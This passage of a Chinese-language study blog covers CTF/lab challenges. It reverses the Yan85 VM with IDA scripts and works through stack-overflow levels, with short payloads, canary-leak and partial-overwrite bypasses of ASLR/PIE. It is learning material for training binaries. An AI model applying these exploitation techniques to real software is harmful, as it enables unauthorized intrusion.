o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure>

<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这合理吗? 就硬堆数量……</p>
<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote>
<p>噢, 有点东西, 完全看不出来发生了什么, 得反汇编看看.</p>
<p>用的md5, 没有办法reverse, 但是可以修改代码内容. </p>
</blockquote>
<ul>
<li>IDA 添加类型 在shift+f1的local types中添加. 也就是view中的open subviews. ctrl+1=quick view</li>
<li>gdb 与 set-uid 程序 与 $base</li>
<li>IDA number of operand.</li>
</ul>
<p>因为使用了<code>mprotect()</code>可以修改代码段, 所以直接找到jnz的地方改成jz. 也就是0x1f01处从75改成74.</p>
<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>使用bin_pedding函数把main函数填充到了2xxx的相对地址处, 不过同上.</p>
<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote>
<p>IDA的rename选项在手册的Give Name to the Location章, 查了下LOCAL and PUBLIC伪指令</p>
<p>我还得查下md5函数怎么用.</p>
</blockquote>
<p>直接把整个程序的每个部分进行一个hash, 所以修改其他地方无法通过验证. 而且只能修改2byte.</p>
<p>没事了, 连着改两个jnz就行了.</p>
<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote>
<p>开始Yan85</p>
</blockquote>
<ul>
<li>LOAD segment 只是个没有名字的段, IDA默认整个名字上去. 可以在段介绍中看到pure data/code之类的.</li>
<li>递归学习:<ul>
<li>在IDA看到一个<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, 还以为七个字符是连在一起的. 结果发现UTF-16LE有特别的地方. 直接改成DATA就会出现\0间隔的字符.</li>
<li>然后就去查16LE是什么. 其实就是UTF-16的little-endian版本. Byte-Order-Mark etc.</li>
<li><strong>UTF-8优势在于ascii是1byte, 16优势在于非ascii是两字节, 32在于不用encoding and decoding</strong>.</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memset的一种实现方法, store string from rax by addr in rdi and counter in rcx.<br>lea	rdx，[rbp+var_110]<br>mov	eax， 0<br>mov	ecx，20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure>

<hr>
<p>Yan85: a1, a2, a3是arg no.</p>
<ul>
<li><p>在main函数中一个256字节的空间(char a1[256+7]), 后面跟着7byte用作七个寄存器的空间. 然后进入execute_program.</p>
</li>
<li><p>describe_register是将数字转换成一个字符, 总共有七个, 每个字符后面都有\0: <code>aNone           db &#39;NONE&#39;,0</code> </p>
</li>
<li><p>describe_* 后面的level可能会用到, 到时再说</p>
</li>
<li><p>write_register是将a2用作a1[256~262]的索引, 然后将a3写入数组中.</p>
<p><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p>
<p>**分别是 <code>8  4  64 32 16 2  1 </code> ** </p>
</li>
<li><p>write_memory被用在stm指令中</p>
</li>
</ul>
<p>然后分析<strong>每个指令</strong>作用: (reg)表示标号对应的寄存器的值.</p>
<ul>
<li>imm 就是     <code>(reg)a2 = a3</code> 加载立即数.</li>
<li>stm其实就是<code>mov [(reg)a2 + a1], a3</code> </li>
<li>syscall(a1, a2, a3), 假设寄存器为<strong>r1 r2 ~ r6</strong>, 然后<strong>if a2 == …</strong> <ul>
<li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3 = fd;</code> </li>
<li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
<li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
<li>16: sleep r1 secs, (reg)a3 = left_time</li>
<li>0x20: <code>exit(r1)</code> </li>
<li>else:  <code>exit( (reg)a3 )</code> </li>
</ul>
</li>
</ul>
<p>如果是12.1, 估计我写个gdb脚本会更方便我查看执行流程. 在每个函数入口处dumpargs, 然后打印出来. 12.0我就直接看看提示.</p>
<p>woc, 12.1都没有函数名称的, 我还得重命名一下函数. </p>
<p>看了前面的一点, 只要<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> 就行. 自动读取flag.</p>
<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote>
<ul>
<li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li>
<li>cmp: 两个寄存器结果放在a1[262]里, 第五位作为标志位, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">小于 : 16  	第5位<br>大于 : 8		第4位<br>等于 : 4 		第3位<br>不等于: <span class="hljs-number">2</span>      第<span class="hljs-number">2</span>位<br>两个全为零:<span class="hljs-number">1</span>   第<span class="hljs-number">1</span>位<br></code></pre></div></td></tr></table></figure></li>
<li><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**分别是 <code>16 64 1  4  8  32 2 </code> ** </li>
</ul>
</blockquote>
<p>看视频看到了新方法.</p>
<ul>
<li>遇到了一个指令解析错误, 只能undefine<code>crash</code>函数, 然后把字节设置成指令 设置函数end 设置新函数.</li>
<li>完全可以只用静态分析, 既然256字节空间之后跟着的是7个register, 那么可以定义一个结构体, 这样decompilerd result会更准确.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>对于describe_register()函数来说可以定义一个enum变量, 就不用搁那翻译每个寄存器是对应哪个数字了.</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote>
<p>emmmmm好像也没什么意义, 纯粹花时间看懂一个流程罢了. 只是复杂度的简单叠加, 把输入的每个bit进行一个加法操作.</p>
</blockquote>
<p>这题是0x81位置上先放九个数, 然后再分别加上一个数字, 然后, 就那样..</p>
<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>还是加上一个数, 勉强做一下. 果然是浪费时间.</p>
<h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote>
<p>开始Yan85 byte code. 直接从没有符号的版本入手开始占卜(</p>
</blockquote>
<p><del>IDA反编译出了问题, 实在是逆转前三个字节顺序的汇编代码太神奇, 一堆符号拓展 零拓展什么的.</del> 然后发现并没有问题.</p>
<p>发现指令编码是这样一个结构:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>在IDA中使用IDC编写脚本(gdb script也行, 也可以设置临时变量之类的).</p>
<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="STM"><a href="#STM" class="headerlink" title="STM:"></a>STM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tSTM: *%s = %s\n&quot;</span>, s1, s2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="LDM"><a href="#LDM" class="headerlink" title="LDM:"></a>LDM:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> mem = AL;<br>msg(<span class="hljs-string">&quot;\tLDM: %s = *(%s); mem:0x%x\n&quot;</span>, s1, s2, mem);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP:"></a>CMP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = get_wide_byte(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff</span>;<br><span class="hljs-keyword">auto</span> reg2 = (get_wide_dword(RBP<span class="hljs-number">-0x20</span>) &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br><span class="hljs-keyword">auto</span> r1=get_wide_byte(RBP<span class="hljs-number">-0x2</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RBP<span class="hljs-number">-0x1</span>);<br>msg(<span class="hljs-string">&quot;\tCMP: %s:%s 0x%x:0x%x\n&quot;</span>, s1, s2, r1, r2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<h4 id="print-all-regs"><a href="#print-all-regs" class="headerlink" title="print all regs:"></a>print all regs:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> r1=get_wide_byte(RDI+<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">auto</span> r2=get_wide_byte(RDI+<span class="hljs-number">1025</span>);<br><span class="hljs-keyword">auto</span> r3=get_wide_byte(RDI+<span class="hljs-number">1026</span>);<br><span class="hljs-keyword">auto</span> r4=get_wide_byte(RDI+<span class="hljs-number">1027</span>);<br><span class="hljs-keyword">auto</span> r5=get_wide_byte(RDI+<span class="hljs-number">1028</span>);<br><span class="hljs-keyword">auto</span> r6=get_wide_byte(RDI+<span class="hljs-number">1029</span>);<br><span class="hljs-keyword">auto</span> r7=get_wide_byte(RDI+<span class="hljs-number">1030</span>);<br><br>msg(<span class="hljs-string">&quot;\t    [V] r1:0x%x r2:0x%x r3:0x%x r4:0x%x r5:0x%x r6:0x%x r7:0x%x\n&quot;</span>, r1,r2,r3,r4,r5,r6,r7);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>

<p>设置完之后就会出现非常漂亮的一个输出, 不过很长, 而且这种输出是会跟着程序流变化的, 不利于整体上的静态分析. 下次尝试避开所有跳转, 按顺序打印出所有的代码, 不然跳来跳去的真的很难看.</p>
<p>结果就是简单的判断字符串相等, 总共9字节. 都在log文件里.</p>
<h3 id="level17-1"><a href="#level17-1" class="headerlink" title="level17"></a>level17</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br></code></pre></div></td></tr></table></figure>

<p>先跳过, 感觉就是复杂度的堆积, 又或者是我方向错了. 到时回来看.</p>
<h1 id="module-8"><a href="#module-8" class="headerlink" title="module 8"></a>module 8</h1><ul>
<li>时至2022年4月22日, c语言排名<a target="_blank" rel="noopener" href="https://www.tiobe.com/tiobe-index/">第二位</a>, 历史最低为第二位. 大部分逆向工具反编译出的结果都是类C语言, 因为c语言是最接近汇编的语言, 还给了开发者一种使用高级语言而不是直接通过汇编去操作寄存器的选择, 被大量使用在操作系统和其他软件的代码中. 而c语言的内存完全控制所带来的问题在near future不会消失, 比如说一些嵌入式设备需要c语言来开发等等.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = gdb.debug(<span class="hljs-string">&#x27;./balabala&#x27;</span>)<br>test_string = cyclic(<span class="hljs-number">128</span>) 	<span class="hljs-comment"># used to identify the location of overflow string</span><br>cyclic_find(<span class="hljs-string">&quot;gaaa&quot;</span>)<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p>stack canary mitigations:</p>
<ul>
<li><p><strong>leak the canary.</strong> </p>
</li>
<li><p><strong>brute-force the canary(for forking processes)</strong> </p>
</li>
<li><p><strong>modify the canary.</strong>  </p>
</li>
<li><p>by forking processes, it can test repeatedly and figure out what the canary is.</p>
</li>
<li><p>the canary begins with null-byte.</p>
</li>
</ul>
</li>
<li><p>alsr mitigation:</p>
<ul>
<li>because all segments are aligned to 0x1000, so changing the least significant byte in a pointer can redirect the flow to another position.</li>
<li><code>setarch x86_64 -R /bin/zsh</code> command</li>
</ul>
</li>
<li><p>uninitilized data.</p>
<ul>
<li>but gcc with high level optimization will probably remove the memset function, as it seems to be pointless.</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>整了pwndbg+tmux的组合视图, 感觉, 有一点点点点用吧…<p hidden>我是真有精力搞这个…</p>成功在tmux里面套娃screen.</li>
<li>使用gdb加上core文件 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/8305866/">stackoverflow</a> <ul>
<li><strong>ulimit -c unlimited</strong> : 解除core dump文件大小限制, 或者直接加在zshrc里面.</li>
<li>然后<code>gdb-pwndbg [filename] [coredump]</code> </li>
<li>视频中使用了cyclic加上gdb core来查看返回地址从而发现buf的溢出位置.</li>
<li>也可以使用valgrind, 不过参数较多.</li>
</ul>
</li>
</ul>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1-2"></a>level1-2</h4><p>简单的忘记了</p>
<h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3-4"></a>level3-4</h4><p>修改返回地址. </p>
<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>gdb 调试出现问题, read一个大数字就会bad address, 直接执行没有出现….</p>
<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>重复利用堆栈, 修改返回地址后顺手改写rbp+0x4开始的四字节为0x1337(4919)</p>
<p>challenge堆栈有没有实用的位置, 应该就是对齐.</p>
<p>发现没啥特别的, 就是固定0x40000地址, 然后跳过win_auth的验证条件直接执行read flag</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>加上了PIE. 利用随机地址仍然是4KB对齐来修改最后两个字节, 不过最高四位只能碰运气了(\x29中的’2’)</p>
<ul>
<li>使用vim编辑二进制文件直接把非print字符整成一个问号存起来……换个办法修改好了…..</li>
<li>要么使用编辑器, 要么vim中使用<code>set binary</code>或<code>-b</code>参数, 然后<code>%!xxd</code> </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">b&#x27;\xa4\x29&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>heap上malloc一个size区域, 七八十字节, 但是在这个区域中使用strlen, 在一堆ped中加入一个空字符即可. </p>
<p>而且加了PIE. 如同上一题的做法.</p>
<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>保护全开. <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">RELRO</a> </p>
<p>最大的问题是开了canary.</p>
<p>嘶—-我知道了, 利用内存寻址可以跳过canary从而直接修改retaddr.</p>
<p>0x79下一个是0x80也是很可以. 下次写十六进制一定加前缀.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">92</span>+<span class="hljs-string">b&#x27;\x77\x1a\x3f&#x27;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>已经将flag读到了栈上, 为了printf的%s能够打印出来, 把buf前面110个字节填充为非零, 紧接着就是flag内容, 这样%s的打印就不会在110处停止.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">110</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>保护全开, 这题是mmap的使用, 以前还没看过详细的机制. youtube的一个<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8hVLcyBkSXY">视频</a>, 还不错.</p>
<p>一连几个mmap都是没有address hint的, 全都连在一起. 而且是向低地址方向map,  最后map的region反而在低地址.</p>
<img src="../../image/pwn-modules/image-20220426223702228.png" srcset="/img/loading.gif" lazyload alt="image-20220426223702228" style="zoom:80%;" />

<p>最后的map只指定了0x5c个字节, 不过还是分配了0x1000一整个page, 全为可写可读. <strong>没搞懂的是为什么/flag映射的是只能执行也可以被printf读取出来</strong>..</p>
<p>所以结果也很简单, 0x3000字节即可.</p>
<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12"></a>level12</h4><p>仍然是全开.</p>
<p>能重复执行challenge, 难不成是leak canary? 而且还有printf %s.</p>
<ul>
<li>第一次0x19个(因为buf和canary之间有undefined区域)填充字符, leak出canary, 然后再次进入challenge</li>
<li>为了能跳转到win, 必须执行完challenge, 即通过canary验证. 第一次执行覆盖了canary第一字节必定不成功, 第二次利用leak出的canary来通过验证并且修改返回地址的低两字节.</li>
<li>这么一说感觉得用pwntools来写了.</li>
</ul>
